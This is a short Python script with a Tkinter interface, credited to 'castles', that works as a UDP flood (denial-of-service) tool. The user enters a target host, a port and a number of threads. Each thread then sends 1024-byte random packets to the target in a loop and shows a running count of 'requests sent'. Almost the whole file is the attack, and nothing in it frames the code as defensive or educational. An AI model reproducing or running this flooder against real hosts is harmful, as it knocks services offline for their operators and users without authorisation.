# made by castles by 10min



from tkinter import *
import socket
import random
from threading import Thread

def on_error():
    start_stop_button.set("Start Flooding")
    status.set("Wrong input. Please check your data.")

def dos():
    global request
    try:
        while start_stop_button.get() == "Stop Flooding":
            s.sendto(packet, (host.get(), int(port.get())))
            request += 1
            status.set(f"Flooding... {request} requests sent!")
    except Exception as e:
        status.set(f"An error occurred: {e}")
        on_error()

def main():
    global s, packet, request
    request = 0
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    if start_stop_button.get() == "Stop Flooding":
        start_stop_button.set("Start Flooding")
    else:
        start_stop_button.set("Stop Flooding")
        packet = random._urandom(1024)
        try:
            for _ in range(int(threads.get())):
                Thread(target=dos).start()
        except Exception as e:
            on_error()
            status.set(f"Error: {e}")

# GUI setup
root = Tk()
root.title("castles")
root.resizable(False, False)

# Variables
host = StringVar()
port = StringVar()
threads = StringVar()
status = StringVar()
start_stop_button = StringVar()
start_stop_button.set("Start Flooding")

# GUI layout
Label(root, text="Host: ").grid(column=1, row=1)
Entry(root, textvariable=host, width=26).grid(column=2, row=1)

Label(root, text="Port: ").grid(column=1, row=2)
Entry(root, textvariable=port, width=26).grid(column=2, row=2)

Label(root, text="Threads: ").grid(column=1, row=3)
Entry(root, textvariable=threads, width=26).grid(column=2, row=3)

Label(root, text="Status: ").grid(column=1, row=4)
Label(root, textvariable=status).grid(column=2, row=4)

Button(root, textvariable=start_stop_button, command=main).grid(column=2, row=5, sticky=E)

for child in root.winfo_children():
    child.grid_configure(padx=5, pady=2)

root.mainloop()
